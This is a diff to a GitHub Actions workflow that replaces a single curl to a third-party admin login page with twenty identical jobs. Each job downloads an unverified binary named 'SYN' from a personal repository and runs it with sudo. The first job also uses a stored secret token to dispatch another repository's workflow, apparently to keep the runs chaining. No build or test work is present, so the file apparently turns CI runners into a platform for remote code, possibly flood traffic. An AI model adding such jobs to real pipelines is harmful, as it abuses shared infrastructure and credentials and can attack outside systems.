@@ -6,10 +6,206 @@ on:
   workflow_dispatch:
 
 jobs:
+  build1:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.AUTH_TOKEN }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 100s
+          curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
   build2:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          curl http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build3:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build4:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build5:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build6:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build7:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build8:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build9:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build10:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build11:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build12:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build13:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build14:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build15:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build16:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build17:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build18:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build19:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
+  build20:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
